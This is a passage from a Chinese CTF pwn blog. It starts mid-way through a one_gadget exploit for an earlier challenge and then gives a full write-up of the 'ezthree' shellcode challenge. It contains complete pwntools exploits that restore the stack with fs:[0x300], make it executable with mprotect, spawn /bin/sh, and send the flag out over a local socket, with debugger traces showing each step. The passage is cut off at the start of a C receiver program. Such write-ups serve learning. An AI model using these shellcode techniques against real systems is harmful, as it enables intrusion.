class="string">&quot;leak_addr: &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    one_gadget=libc_base+<span class="number">0xf1247</span></span><br><span class="line"></span><br><span class="line">    test=one_gadget</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">        char=test%<span class="number">0x100</span></span><br><span class="line">        <span class="keyword">if</span> (char&gt;<span class="number">0x7e</span> <span class="keyword">or</span> char&lt;<span class="number">0x20</span> ):</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        test=test//<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">if</span> (flag==<span class="number">1</span>):</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x1D</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这个题目搭环境花了好长时间，本地打通以后打不通远程，用 gdbserver 调试了一下才发现 heap 环境不一样</p>
<p>学到了不少东西：</p>
<ul>
<li>gdbserver 调试 docker 中的环境</li>
<li>KVM api</li>
<li>一些汇编的知识</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/" class="post-title-link" itemprop="url">shellcode+socket本地进程通信</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-07 20:30:59" itemprop="dateCreated datePublished" datetime="2022-07-07T20:30:59+08:00">2022-07-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-20 09:22:27" itemprop="dateModified" datetime="2022-08-20T09:22:27+08:00">2022-08-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>ezthree 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>)</span> stable release version 2.23, by Roland McGrath et</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ezthree ./ezthree </span><br><span class="line">INput &gt;&gt; yehllow</span><br><span class="line">code &gt; <span class="number">12346</span> </span><br><span class="line">over!!!</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ezthree: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>_amd64/ld<span class="number">-2.23</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=a03fffb75b5c647383a7faca81d76966f05f7564, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p><strong>代码分析</strong></p>
<p>其实前面的代码都没有什么用，关键就是最后可以注入一个 shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( LODWORD(buf[<span class="number">5</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">  output(<span class="string">&quot;You want to do sometings ?\n&quot;</span>);</span><br><span class="line">  read_s((<span class="keyword">char</span> *)shellcode + <span class="number">0xFD8</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode, overlap, <span class="number">0x3D</span>uLL);</span><br><span class="line">  shellcode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但执行该 shellcode 前，需要先执行以下代码：</p>
<p><img src="/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/1656742003103.png" alt="1656742003103"> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xf3e03346000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax rdi <span class="number">0xf3e03346000</span> ◂— <span class="keyword">xor</span>    rax, rax <span class="comment">/* 0xf7894c0bb0c03148 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0xf3e03346008</span> ◂— mov    rsi, r15 <span class="comment">/* 0xc03148050ffe894c */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0xf3e03346010</span> ◂— <span class="keyword">xor</span>    rbx, rbx <span class="comment">/* 0x3148c93148db3148 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0xf3e03346018</span> ◂— ror    byte ptr [rax + <span class="number">0x31</span>], cl <span class="comment">/* 0x48f63148ff3148d2 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0xf3e03346020</span> ◂— <span class="keyword">xor</span>    ebp, ebp <span class="comment">/* 0xc0314de43148ed31 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0xf3e03346028</span> ◂— <span class="keyword">xor</span>    r9, r9 <span class="comment">/* 0x314dd2314dc9314d */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0xf3e03346030</span> ◂— fisttp dword ptr [rbp + <span class="number">0x31</span>] <span class="comment">/* 0x4ded314de4314ddb */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0xf3e03346038</span> ◂— <span class="keyword">xor</span>    esi, esi <span class="comment">/* 0x909090ff314df631 */</span></span><br></pre></td></tr></table></figure>
<p>限制点：常规寄存器全被清空（除了 RIP），尤其是 RSP，导致 shellcode 不能正常执行</p>
<p>漏洞点：第一次 input 可以无限写入数据</p>
<p><strong>入侵思路</strong></p>
<p>在网上借鉴了其他大佬的 wp 后，我发现 <code>mov rsp, fs:[0x300]</code> 这条指令可以恢复栈，我的思路为：</p>
<ul>
<li>利用第一次 input 在栈上留下 execve(“/bin/sh” , 0 , 0) 的汇编代码（第二次 input 不够长）</li>
<li>mprotect(rsp , 0x1000 , 7) 使栈获取执行权限</li>
<li>jmp rsp + jmp $+0x32 执行栈上的 execve(“/bin/sh” , 0 , 0)</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./ezthree&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ezthree&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zero</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;zero&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;nop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movrax</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;movrax&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x185E)\n&quot;)</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		jmp $+0x32</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line">	</span><br><span class="line">shellcode+=<span class="string">&quot;&quot;</span>.ljust(<span class="number">0x30</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov r8 ,rsp</span></span><br><span class="line"><span class="string">        ADD r8 ,0x4b</span></span><br><span class="line"><span class="string">		mov rax, 59</span></span><br><span class="line"><span class="string">		xor rdx, rdx</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">		mov rdi, r8</span></span><br><span class="line"><span class="string">		syscall	</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">		push 0x1000</span></span><br><span class="line"><span class="string">		pop rsi</span></span><br><span class="line"><span class="string">		push 7</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string">		push 0xA</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		and rdi, 0xFFFFFFFFFFFFF000</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		sub rsp,0x67</span></span><br><span class="line"><span class="string">		jmp rsp</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffd20125212</span>    syscall  &lt;SYS_execve&gt;</span><br><span class="line">       path: <span class="number">0x7ffd20125214</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">       argv: <span class="number">0x0</span></span><br><span class="line">       envp: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ni</span><br><span class="line">process <span class="number">8910</span> is executing <span class="keyword">new</span> program: /usr/bin/dash</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x42f10b76fd8</span></span><br><span class="line">Cannot insert breakpoint <span class="number">1.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x559debc0185e</span></span><br></pre></td></tr></table></figure>
<ul>
<li>虽然获取 shell 了，但是有个无法避免的报错</li>
</ul>
<p>直接 get shell 不行，我便想试试 ORW，但又有一个问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">close(<span class="number">0</span>);</span><br><span class="line">close(<span class="number">1</span>);</span><br><span class="line">close(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>close 0 1 2，必然要找其他通信方式</li>
</ul>
<p>网上有一个大佬采用自己创建 socket 管道去通信，orw flag 发送</p>
<p>关于 socket 通信可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010073981/article/details/50734484">Linux socket 本地进程间通信</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff329758b5</span>    syscall  &lt;SYS_socket&gt;</span><br><span class="line">       domain: <span class="number">0x1</span></span><br><span class="line">       type: <span class="number">0x1</span></span><br><span class="line">       protocol: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff329758d5</span>    syscall  &lt;SYS_connect&gt;</span><br><span class="line">       fd: <span class="number">0x0</span> (socket:[<span class="number">159357</span>])</span><br><span class="line">       addr: <span class="number">0x7fff32975889</span> ◂— <span class="number">0x420001</span> <span class="comment">// serv_addr </span></span><br><span class="line">       len: <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
<p>关键点就是 <code>SYS_socket</code> 和 <code>SYS_connect</code> ，执行完这两个函数后，就可以开始 ORW 了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff3297591e</span>    syscall  &lt;SYS_open&gt;</span><br><span class="line">       file: <span class="number">0x7fff32975881</span> ◂— <span class="number">0x67616c66</span> <span class="comment">/* &#x27;flag&#x27; */</span></span><br><span class="line">       oflag: <span class="number">0x0</span></span><br><span class="line">       vararg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff3297592f</span>    syscall  &lt;SYS_read&gt;</span><br><span class="line">       fd: <span class="number">0x1</span> (/home/yhellow/桌面/ezthree/flag)</span><br><span class="line">       buf: <span class="number">0x7fff32975881</span> ◂— <span class="number">0x67616c66</span> <span class="comment">/* &#x27;flag&#x27; */</span></span><br><span class="line">       nbytes: <span class="number">0x50</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff3297593b</span>    syscall  &lt;SYS_write&gt;</span><br><span class="line">       fd: <span class="number">0x0</span> (socket:[<span class="number">159357</span>])</span><br><span class="line">       buf: <span class="number">0x7fff32975881</span> ◂— <span class="string">&#x27;flag&#123;yhellow&#125;\n&#x27;</span></span><br><span class="line">       n: <span class="number">0x50</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/1657196032861.png" alt="1657196032861">  </p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./ezthree&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zero</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;zero&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;nop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movrax</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;movrax&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x185E)&quot;)</span></span><br><span class="line"></span><br><span class="line">serv_addr = <span class="number">0x420001</span> <span class="comment"># serv_addr</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rax, 41</span></span><br><span class="line"><span class="string">		mov rdi, 1</span></span><br><span class="line"><span class="string">		mov rsi, 1</span></span><br><span class="line"><span class="string">		mov rdx, 0</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		push 0</span></span><br><span class="line"><span class="string">		mov rcx, 0x420001</span></span><br><span class="line"><span class="string">		push rcx</span></span><br><span class="line"><span class="string">		mov rsi, rsp</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		mov rax, 42</span></span><br><span class="line"><span class="string">		mov rdx, 0x10</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		jmp $+0x32</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line">	</span><br><span class="line">shellcode+=<span class="string">&quot;b&quot;</span>*<span class="number">0x30</span></span><br><span class="line">	</span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		push 0x67616c66</span></span><br><span class="line"><span class="string">		mov rax, 2</span></span><br><span class="line"><span class="string">		xor rdx, rdx</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		xor rsi, rsi</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		xchg rdi, rax</span></span><br><span class="line"><span class="string">		mov rsi, rsp</span></span><br><span class="line"><span class="string">		mov rdx, 0x50</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		mov rax, 1</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(shellcode+<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">		push 0x1000</span></span><br><span class="line"><span class="string">		pop rsi</span></span><br><span class="line"><span class="string">		push 7</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string">		push 0xA</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		and rdi, 0xFFFFFFFFFFFFF000</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		sub rsp,0x67</span></span><br><span class="line"><span class="string">		jmp rsp</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>用于接收 flag 的脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc recv.c -o recv -g */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  